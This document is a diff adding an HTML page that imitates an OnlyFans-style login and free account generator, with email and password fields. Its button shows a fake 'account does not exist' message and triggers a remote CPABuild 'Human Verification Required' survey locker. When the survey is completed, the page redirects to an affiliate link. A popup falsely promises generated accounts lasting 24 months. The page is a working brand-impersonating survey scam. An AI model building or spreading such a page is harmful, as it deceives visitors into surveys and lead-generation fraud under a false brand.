@@ -1,0 +1,756 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8">
+
+  <title data-react-helmet="true">𝗢𝗻𝗹𝘆𝗙𝗮𝗻𝘀𝗠𝘅</title>
+  <link data-react-helmet="true" rel="icon" href="./icons/icon.png"/>
+</head>
+<body>
+<!-- partial:index.partial.html -->
+<html lang="en"><head>
+
+
+
+
+
+
+
+<!-- Analytics -->
+<script async="" src="https://www.google-analytics.com/analytics.js"></script><script>
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+
+    
+    ga('send', 'pageview');
+
+</script>
+<script src="https://browser.sentry-cdn.com/5.20.1/bundle.min.js" integrity="sha384-O8HdAJg1h8RARFowXd2J/r5fIWuinSBtjhwQoPesfVILeXzGpJxvyY/77OaPPXUo" crossorigin="anonymous"></script>
+<script>
+    Sentry.init({ dsn: 'https://ecc33db07c514172b5606edcabb2884e@o425163.ingest.sentry.io/5357949' });
+</script>
+
+    <style>
+      
+      #snackbar {
+  visibility: hidden;
+  min-width: 250px;
+  margin-left: -125px;
+  background-color: rgba(255, 0, 0, 0.179);
+  color: rgba(228, 0, 0, 0.487);
+  text-align: center;
+  border-radius: 10px;
+  padding: 16px;
+  position: fixed;
+  z-index: 1;
+  left: 50%;
+  bottom: 30px;
+  font-size: 17px;
+}
+
+#snackbar.show {
+  visibility: visible;
+  -webkit-animation: fadein 0.7s, fadeout 0.7s 2.7s;
+  animation: fadein 0.7s, fadeout 0.7s 2.7s;
+}
+
+@-webkit-keyframes fadein {
+  from {bottom: 0; opacity: 0;} 
+  to {bottom: 30px; opacity: 1;}
+}
+
+@keyframes fadein {
+  from {bottom: 0; opacity: 0;}
+  to {bottom: 30px; opacity: 1;}
+}
+
+@-webkit-keyframes fadeout {
+  from {bottom: 30px; opacity: 1;} 
+  to {bottom: 0; opacity: 0;}
+}
+
+@keyframes fadeout {
+  from {bottom: 30px; opacity: 1;}
+  to {bottom: 0; opacity: 0;}
+}
+      
+      
+      
+        .header_blue {
+            background: #e2007a;
+            padding: 80px 0 20px;
+            color: #fff;
+            font-size: 48px;
+            font-weight: 300;
+            margin-bottom: 40px;
+        }
+        .header_text {
+            margin-left: auto;
+            margin-right: auto;
+            width: 80%;
+        }
+        body{
+            margin:0;
+            font-family:Roboto, sans-serif;
+            color:#444;
+        }
+        .unlockBtn:hover{
+            box-shadow: 0 3px 6px rgba(0,0,0,.16), 0 3px 6px rgba(0,0,0,.23);
+        }
+        .unlockBtn {
+            background: #e2007a;
+            border: none;
+            border-radius: 2px;
+            box-shadow: 0 1px 3px rgba(0,0,0,.12), 0 1px 2px rgba(0,0,0,.24);
+            min-height: 31px;
+            min-width: 70px;
+            padding: 2px 16px;
+            text-align: center;
+            text-shadow: none;
+            text-transform: uppercase;
+            -webkit-transition: all 280ms ease;
+            transition: all 280ms ease;
+            box-sizing: border-box;
+            cursor: pointer;
+            -webkit-appearance: none;
+            display: inline-block;
+            vertical-align: middle;
+            font: 500 14px/31px Roboto,sans-serif!important;
+            outline: 0!important;
+            color:white;
+        }
+        .content-container{
+            width:80%;margin:0 auto;
+        }
+        @font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Pru33qjShpZSmG3z6VYwnRJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:300;src:local('Roboto Light'),local(Roboto-Light),url(//fonts.gstatic.com/s/roboto/v15/Hgo13k-tfSpn0qi1SFdUfVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/oOeFwZNlrTefzLYmlVV1UBJtnKITppOI_IvcXXDNrsc.woff2) format("woff2");unicode-range:U+0100-024F,U+1E00-1EFF,U+20A0-20AB,U+20AD-20CF,U+2C60-2C7F,U+A720-A7FF}@font-face{font-family:'Roboto';font-style:normal;font-weight:500;src:local('Roboto Medium'),local(Roboto-Medium),url(//fonts.gstatic.com/s/roboto/v15/RxZJdnzeo3R5zSexge8UUVtXRa8TVwTICgirnJhmVJw.woff2) format("woff2");unicode-range:U+0000-00FF,U+0131,U+0152-0153,U+02C6,U+02DA,U+02DC,U+2000-206F,U+2074,U+20AC,U+2212,U+2215,U+E0FF,U+EFFD,U+F000}
+        body {
+  margin: 0;
+  font-family: 'Open Sans', sans-serif;
+}
+input {
+  outline: 0;
+  border: 0;
+  display: block;
+}
+.textbox {
+  display: block;
+  max-height: 48px;
+  padding: 20px 8px 4px 8px;
+  width: 264px;
+  height: 48px;
+  position: relative;
+}
+.textbox input[type="text"],
+.textbox input[type="url"],
+.textbox input[type="tel"],
+.textbox input[type="number"],
+.textbox input[type="color"],
+.textbox input[type="email"],
+.textbox input[type="name"],
+.textbox input[type="password"] {
+  width: 256px;
+  padding: 8px 4px 6px 4px;
+  font-size: 1.2em;
+  background: rgba(0,0,0,0);
+  color: rgba(0,0,0,0.67);
+  border-bottom: 1px solid rgba(0,0,0,0.4);
+}
+.textbox input[type="text"]:disabled,
+.textbox input[type="url"]:disabled,
+.textbox input[type="tel"]:disabled,
+.textbox input[type="number"]:disabled,
+.textbox input[type="color"]:disabled,
+.textbox input[type="email"]:disabled,
+.textbox input[type="password"]:disabled {
+  border-bottom: 2px dotted rgba(0,0,0,0.4);
+}
+.textbox input[type="text"]:disabled ~ label,
+.textbox input[type="url"]:disabled ~ label,
+.textbox input[type="tel"]:disabled ~ label,
+.textbox input[type="number"]:disabled ~ label,
+.textbox input[type="color"]:disabled ~ label,
+.textbox input[type="email"]:disabled ~ label,
+.textbox input[type="password"]:disabled ~ label {
+  color: rgba(0,0,0,0.4);
+}
+.textbox input[type="text"] ~ label,
+.textbox input[type="url"] ~ label,
+.textbox input[type="tel"] ~ label,
+.textbox input[type="number"] ~ label,
+.textbox input[type="color"] ~ label,
+.textbox input[type="email"] ~ label,
+.textbox input[type="password"] ~ label {
+  font-size: 1.2em;
+  color: rgba(0,0,0,0.67);
+  display: block;
+  position: absolute;
+  top: 24px;
+  left: 12px;
+  pointer-events: none;
+  margin-right: 12px;
+  transition: all 0.2s;
+}
+.textbox input[type="text"] ~ .error,
+.textbox input[type="url"] ~ .error,
+.textbox input[type="tel"] ~ .error,
+.textbox input[type="number"] ~ .error,
+.textbox input[type="color"] ~ .error,
+.textbox input[type="email"] ~ .error,
+.textbox input[type="password"] ~ .error {
+  position: absolute;
+  bottom: -5px;
+  left: 16px;
+  color: rgba(0,0,0,0);
+  font-size: 0.8em;
+  pointer-events: none;
+  transition: all 0.2s;
+}
+.textbox input[type="text"] ~ .error:before,
+.textbox input[type="url"] ~ .error:before,
+.textbox input[type="tel"] ~ .error:before,
+.textbox input[type="number"] ~ .error:before,
+.textbox input[type="color"] ~ .error:before,
+.textbox input[type="email"] ~ .error:before,
+.textbox input[type="password"] ~ .error:before {
+  content: '';
+  display: block;
+  width: 0;
+  height: 2px;
+  background: #e2007a;
+  position: absolute;
+  top: -3px;
+  left: -8px;
+  margin-left: 132px;
+  visibility: visible;
+  transition: all 0.2s;
+}
+.textbox input[type="text"]:not([value=""]) ~ label,
+.textbox input[type="url"]:not([value=""]) ~ label,
+.textbox input[type="tel"]:not([value=""]) ~ label,
+.textbox input[type="number"]:not([value=""]) ~ label,
+.textbox input[type="color"]:not([value=""]) ~ label,
+.textbox input[type="email"]:not([value=""]) ~ label,
+.textbox input[type="password"]:not([value=""]) ~ label {
+  font-size: 0.8em;
+  top: 8px;
+}
+.textbox input[type="text"]:focus ~ label,
+.textbox input[type="url"]:focus ~ label,
+.textbox input[type="tel"]:focus ~ label,
+.textbox input[type="number"]:focus ~ label,
+.textbox input[type="color"]:focus ~ label,
+.textbox input[type="email"]:focus ~ label,
+.textbox input[type="password"]:focus ~ label {
+  font-size: 0.8em;
+  top: 8px;
+}
+.textbox input[type="text"]:focus ~ .error:before,
+.textbox input[type="url"]:focus ~ .error:before,
+.textbox input[type="tel"]:focus ~ .error:before,
+.textbox input[type="number"]:focus ~ .error:before,
+.textbox input[type="color"]:focus ~ .error:before,
+.textbox input[type="email"]:focus ~ .error:before,
+.textbox input[type="password"]:focus ~ .error:before {
+  width: 264px;
+  margin: 0;
+}
+.textbox input[type="text"]:invalid:not(:focus):not([value=""]) ~ .error,
+.textbox input[type="url"]:invalid:not(:focus):not([value=""]) ~ .error,
+.textbox input[type="tel"]:invalid:not(:focus):not([value=""]) ~ .error,
+.textbox input[type="number"]:invalid:not(:focus):not([value=""]) ~ .error,
+.textbox input[type="color"]:invalid:not(:focus):not([value=""]) ~ .error,
+.textbox input[type="email"]:invalid:not(:focus):not([value=""]) ~ .error,
+.textbox input[type="password"]:invalid:not(:focus):not([value=""]) ~ .error {
+  color: #f44336;
+}
+.textbox input[type="text"]:invalid:not(:focus):not([value=""]) ~ .error:before,
+.textbox input[type="url"]:invalid:not(:focus):not([value=""]) ~ .error:before,
+.textbox input[type="tel"]:invalid:not(:focus):not([value=""]) ~ .error:before,
+.textbox input[type="number"]:invalid:not(:focus):not([value=""]) ~ .error:before,
+.textbox input[type="color"]:invalid:not(:focus):not([value=""]) ~ .error:before,
+.textbox input[type="email"]:invalid:not(:focus):not([value=""]) ~ .error:before,
+.textbox input[type="password"]:invalid:not(:focus):not([value=""]) ~ .error:before {
+  margin: 0;
+  width: 264px;
+  background: #f44336;
+}
+.textbox input[type="text"]:valid:not(:focus) ~ .error:before,
+.textbox input[type="url"]:valid:not(:focus) ~ .error:before,
+.textbox input[type="tel"]:valid:not(:focus) ~ .error:before,
+.textbox input[type="number"]:valid:not(:focus) ~ .error:before,
+.textbox input[type="color"]:valid:not(:focus) ~ .error:before,
+.textbox input[type="email"]:valid:not(:focus) ~ .error:before,
+.textbox input[type="password"]:valid:not(:focus) ~ .error:before {
+  margin: 0;
+  width: 264px;
+  background: #f44336;
+}
+.textbox input[type="text"] ~ .info,
+.textbox input[type="url"] ~ .info,
+.textbox input[type="tel"] ~ .info,
+.textbox input[type="number"] ~ .info,
+.textbox input[type="color"] ~ .info,
+.textbox input[type="email"] ~ .info,
+.textbox input[type="password"] ~ .info {
+  position: absolute;
+  top: 16px;
+  right: 12px;
+  width: 24px;
+  height: 24px;
+  margin: 8px -16px 8px 8px;
+  padding: 0 16px 0 0;
+  border-radius: 100%;
+  color: rgba(0,0,0,0.67);
+  cursor: pointer;
+  transition: all 0.2s;
+}
+.textbox input[type="text"] ~ .info .tooltip,
+.textbox input[type="url"] ~ .info .tooltip,
+.textbox input[type="tel"] ~ .info .tooltip,
+.textbox input[type="number"] ~ .info .tooltip,
+.textbox input[type="color"] ~ .info .tooltip,
+.textbox input[type="email"] ~ .info .tooltip,
+.textbox input[type="password"] ~ .info .tooltip {
+  width: auto;
+  max-width: 256px;
+  position: absolute;
+  top: -6px;
+  right: 24px;
+  transform: translateX(100%) scale(0.8);
+  background: rgba(0,0,0,0.9);
+  color: rgba(255,255,255,0.9);
+  padding: 8px;
+  border-radius: 2px;
+  white-space: pre;
+  font-size: 0.8em;
+  visibility: hidden;
+  opacity: 0;
+  transition: all 0.2s;
+}
+.textbox input[type="text"] ~ .info .tooltip:before,
+.textbox input[type="url"] ~ .info .tooltip:before,
+.textbox input[type="tel"] ~ .info .tooltip:before,
+.textbox input[type="number"] ~ .info .tooltip:before,
+.textbox input[type="color"] ~ .info .tooltip:before,
+.textbox input[type="email"] ~ .info .tooltip:before,
+.textbox input[type="password"] ~ .info .tooltip:before {
+  content: '';
+  display: block;
+  position: absolute;
+  top: 9px;
+  left: -10px;
+  border-style: solid;
+  border-width: 8px 10px 8px 0;
+  border-color: transparent rgba(0,0,0,0.9) transparent transparent;
+  z-index: -1;
+}
+.textbox input[type="text"] ~ .info:hover,
+.textbox input[type="url"] ~ .info:hover,
+.textbox input[type="tel"] ~ .info:hover,
+.textbox input[type="number"] ~ .info:hover,
+.textbox input[type="color"] ~ .info:hover,
+.textbox input[type="email"] ~ .info:hover,
+.textbox input[type="password"] ~ .info:hover {
+  color: rgba(0,0,0,0.9);
+}
+.textbox input[type="text"] ~ .info:hover .tooltip,
+.textbox input[type="url"] ~ .info:hover .tooltip,
+.textbox input[type="tel"] ~ .info:hover .tooltip,
+.textbox input[type="number"] ~ .info:hover .tooltip,
+.textbox input[type="color"] ~ .info:hover .tooltip,
+.textbox input[type="email"] ~ .info:hover .tooltip,
+.textbox input[type="password"] ~ .info:hover .tooltip,
+.tooltip:hover {
+  visibility: visible;
+  opacity: 1;
+  right: 0;
+  transform: translateX(100%);
+}
+.textbox input[type="text"]:disabled ~ .info,
+.textbox input[type="url"]:disabled ~ .info,
+.textbox input[type="tel"]:disabled ~ .info,
+.textbox input[type="number"]:disabled ~ .info,
+.textbox input[type="color"]:disabled ~ .info,
+.textbox input[type="email"]:disabled ~ .info,
+.textbox input[type="password"]:disabled ~ .info {
+  color: rgba(0,0,0,0.4);
+}
+.textbox input[type="text"]:disabled ~ .info .tooltip,
+.textbox input[type="url"]:disabled ~ .info .tooltip,
+.textbox input[type="tel"]:disabled ~ .info .tooltip,
+.textbox input[type="number"]:disabled ~ .info .tooltip,
+.textbox input[type="color"]:disabled ~ .info .tooltip,
+.textbox input[type="email"]:disabled ~ .info .tooltip,
+.textbox input[type="password"]:disabled ~ .info .tooltip {
+  background: rgba(0,0,0,0.67);
+}
+.textbox input[type="text"]:disabled ~ .info .tooltip:before,
+.textbox input[type="url"]:disabled ~ .info .tooltip:before,
+.textbox input[type="tel"]:disabled ~ .info .tooltip:before,
+.textbox input[type="number"]:disabled ~ .info .tooltip:before,
+.textbox input[type="color"]:disabled ~ .info .tooltip:before,
+.textbox input[type="email"]:disabled ~ .info .tooltip:before,
+.textbox input[type="password"]:disabled ~ .info .tooltip:before {
+  border-color: transparent rgba(0,0,0,0.67) transparent transparent;
+}
+.textbox input[type="text"]:disabled ~ .info:hover,
+.textbox input[type="url"]:disabled ~ .info:hover,
+.textbox input[type="tel"]:disabled ~ .info:hover,
+.textbox input[type="number"]:disabled ~ .info:hover,
+.textbox input[type="color"]:disabled ~ .info:hover,
+.textbox input[type="email"]:disabled ~ .info:hover,
+.textbox input[type="password"]:disabled ~ .info:hover {
+  color: rgba(0,0,0,0.67);
+}
+
+
+.unlockBtn {
+  background-color: #e2007a; /* Green */
+  border: none;
+  color: white;
+  padding: 12px;
+   padding-left: 70px;
+    padding-right: 70px;
+  text-align: center;
+  text-decoration: none;
+  display: inline-block;
+  font-size: 16px;
+  margin: 4px 2px;
+  cursor: pointer;
+}
+
+.showContentLocker {border-radius: 30px;}
+
+.showContentLocker:hover {
+  background-color: #e2007a; /* Green */
+  color: white;
+}
+
+
+
+div.label {
+font-weight: lighter;
+font-size: 10%;
+}
+            
+
+
+
+
+
+/**
+ * Footer Styles
+ */
+
+.footer {
+  position: absolute;
+  right: 0;
+  bottom: 0;
+  left: 0;
+  padding: 1rem;
+  background-color: #fff;
+  text-align: center;
+font-size: 10px;
+}
+/* mouse over link */
+a:hover {
+  color: #e2007a;
+}
+
+/* selected link */
+a:active {
+  color: #e2007a;
+}  
+    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<script type="text/javascript" src="https://d1xkyo9j4r7vnn.cloudfront.net/public/external/v2/html.1105824.8c796.1.js" id="CPABUILDMAINJS"></script><link rel="stylesheet" href="https://d1xkyo9j4r7vnn.cloudfront.net/public/external/css_front.css" id="CPABUILDGLOBALSTYLE"><link data-it="1105824" rel="stylesheet" id="CPABUILDSPECIFICSTYLE" href="https://d1xkyo9j4r7vnn.cloudfront.net/public/clockers/HumanVerification/css.css"><style type="text/css" id="CPABUILDSettingsCSS">#CPABUILD_MODAL_CONTAINER strong{color:#00a8ff}
+
+#CPABUILD_MODAL_CONTAINER #CPABUILDMODALTITLE{color:#272727}
+
+#CPABUILD_MODAL_CONTAINER #CPABUILDMODALFOOTER{color:#000000}
+
+#CPABUILD_MODAL_CONTAINER #CPABUILD_MODAL{font-family:Arial}
+
+#CPABUILD_MODAL_CONTAINER #CPABUILDMODALCONTENT{animation-duration: 600ms;-webkit-transition: all 600ms;transition: all 600ms;transition-duration: 600ms;}#CPABUILD_MODAL_CONTAINER #CPABUILD_MODAL {background-color: rgba(0,0,0,0.4) }</style><script type="text/javascript" src="https://d1xkyo9j4r7vnn.cloudfront.net/public/guid?cpguid=c8svi43vl&amp;e=ll&amp;t=1603422252915"></script><script id="CPABUILDLEADCHECK" type="text/javascript" src="https://d1xkyo9j4r7vnn.cloudfront.net/public/external/check.php?it=1105824&amp;time=1603422254187"></script></head>
+<body translate="no">
+
+<div class="error_page_content">
+    <div class="content-container">
+       
+
+
+
+<center>
+<br>
+<br>
+<br>
+<a href=""><img src="./icons/logoa.png" width="260" height="auto" alt="logo"></a>
+<br>
+<br>
+
+<br>
+  <div class="textbox">
+  <input id="email" required="/^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)?$/i" type="email" value="" onkeyup="this.setAttribute('value', this.value);"><label for="email">Email Address</label>
+  <div class="error">
+    Invalid email address
+  </div>
+  
+</div>
+<div class="textbox">
+  <input id="password" required="" type="password" value="" onkeyup="this.setAttribute('value', this.value);"><label for="password">Create Password</label>
+  <div class="error">
+    Invalid password
+  </div>  
+</div>
+
+
+
+<br>
+<br>
+<button class="unlockBtn showContentLocker" onclick="myFunction()"><b> Iniciar Sesion </b></button>
+  <div id="snackbar"><b>Esta cuenta no existe</b></div>
+<div class="modal js-loading-bar">
+ <div class="modal-dialog">
+   <div class="modal-content">
+     <div class="modal-body">
+       <div class="progress progress-popup">
+        <div class="progress-bar"></div>
+       </div>
+     </div>
+   </div>
+ </div>
+</div>
+</center>
+
+
+    </div>
+</div>
+
+
+<center>
+<script>
+function myFunction() {
+  var x = document.getElementById("snackbar");
+  x.className = "show";
+  setTimeout(function(){ x.className = x.className.replace("show", ""); }, 3000);
+}
+</script>
+ 
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-size: cover;
+  height: 100vh;
+}
+
+h1 {
+  text-align: center;
+  font-family: Tahoma, Arial, sans-serif;
+  color: #f44336;
+  margin: 80px 0;
+}
+
+.box {
+  width: 40%;
+  margin: 0 auto;
+  background: rgba(255,255,255,0.2);
+  padding: 35px;
+  border: 2px solid #fff;
+  border-radius: 20px/50px;
+  background-clip: padding-box;
+  text-align: center;
+}
+
+.button {
+  font-size: 1em;
+  padding: 10px;
+  color:  #e2007a;
+  font-weight: bold;
+  border-radius: 20px/50px;
+  text-decoration: none;
+  cursor: pointer;
+  transition: all 0.3s ease-out;
+}
+
+
+.overlay {
+  position: fixed;
+  top: 0;
+  bottom: 0;
+  left: 0;
+  right: 0;
+  background: rgba(0, 0, 0, 0.7);
+  transition: opacity 500ms;
+  visibility: hidden;
+  opacity: 0;
+}
+.overlay:target {
+  visibility: visible;
+  opacity: 1;
+}
+
+.popup {
+  margin: 70px auto;
+  padding: 20px;
+  background: #fff;
+  border-radius: 5px;
+  width: 30%;
+  position: relative;
+  transition: all 5s ease-in-out;
+}
+
+.popup h2 {
+  margin-top: 0;
+  color: #333;
+  font-family: Tahoma, Arial, sans-serif;
+}
+.popup .close {
+  position: absolute;
+  top: 20px;
+  right: 30px;
+  transition: all 200ms;
+  font-size: 30px;
+  font-weight: bold;
+  text-decoration: none;
+  color: #333;
+}
+.popup .close:hover {
+  color: #e2007a;
+}
+.popup .content {
+  max-height: 30%;
+  overflow: auto;
+}
+
+@media screen and (max-width: 700px){
+  .box{
+    width: 70%;
+  }
+  .popup{
+    width: 70%;
+  }
+}
+
+.content {
+    text-align: left;
+  }
+</style>
+
+  <script>
+  window.console = window.console || function(t) {};
+</script>
+
+  
+  
+  <script>
+  if (document.location.search.match(/type=embed/gi)) {
+    window.parent.postMessage("resize", "*");
+  }
+</script>
+
+
+
+
+<div class="box">
+	<a class="button" href="./signup.html">Crear una cuenta?</a>
+</div>
+
+
+<!--
+
+<div class="box">
+	<a class="button" href="#popup1">How it works?</a>
+</div>-->
+
+<div id="popup1" class="overlay">
+	<div class="popup">
+		<h2>How it works?</h2><hr>
+		<a class="close" href="#">×</a>
+		<div class="content">
+			<b>Step 1)</b>  Enter your Email and create a Password.
+            <br><br>
+			<b>Step 2)</b>   Press  "GENERATE NOW" an account will be generated for you.
+            <br><br>
+			<b>Step 3)</b>   Verficiation and Delivery!<br>(Account details will be sent to your Email).
+            <br><br><hr>
+<center>
+<iframe width="300" height="195" src="https://www.youtube.com" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
+</center>
+<hr>
+
+<center><b>Each account made for 24 Months</b></center>
+		</div>
+	</div>
+</div>
+
+
+
+
+
+</center>
+    		
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":1105824,"key":"8c796"};
+    var forward="https:\/\/smrturl.co\/o\/99827\/53180135?s1=";
+    CPABUILDSETTINGS.onComplete=function(data){
+        window.location=forward;
+        return false;
+    };
+</script>
+<script src="https://d13nu0oomnx5ti.cloudfront.net/ff41d6c.js"></script>
+<script type="text/javascript">
+    $('.showContentLocker').click(function(){
+       CPABuildLock();
+        return false;
+    });
+</script>
+<script>
+
+</script>
+<script type="text/javascript">
+    $(document).ready(function(){
+	//Javascript Here
+
+});
+
+$('.textbox input').attr('value', "");
+$('.textbox input').attr('onkeyup', "this.setAttribute('value', this.value);");
+$('.textbox .info').append('<i class="material-icons">info</i>');
+//# sourceURL=pen.js
+
+
+
+</script>
+<script>
+    if(typeof window.ga === 'function'){
+        ga('create', 'UA-85922709-2', 'auto', 'customTemplateGlobal');
+        ga('customTemplateGlobal.set', 'dimension1', typeof window.CPBContentLocker === 'function' ? 0 : 1);
+        ga('customTemplateGlobal.send', 'pageView');
+    }
+
+
+</script>
+
+
+<div id="CPABUILD_MODAL_CONTAINER" style="display: none;" class=" CPABUILD_MODAL_CONTAINER_MOBILE"><div id="CPABUILD_MODAL">
+    <div id="CPABUILDMODALCONTENT" class="CPABUILD_animateTop">
+        <div id="CPABUILDMODALHEADER"> <button type="button" class="close" id="CPABUILD_MODAL_CLOSE" aria-label="Close"><i id="CPABUILD_MODAL_ICON" class="fa fa-lock"></i></button>
+            <div id="CPABUILDMODALTITLE">Human Verification Required</div> </div>
+        <div id="CPABUILDMODALBODY">
+            <iframe id="CPABUILDOFFERS" scrolling="no" src=""></iframe>
+        </div>
+        <div id="CPABUILDMODALFOOTER">
+            <p id="CPABUILDMODALFOOTERTEXT"> <strong>Verification concluded automatically upon survey completion.</strong> </p>
+        </div>
+    </div>
+</div>
+</div></body></html>
+<!-- partial -->
+  
+</body>
+</html>
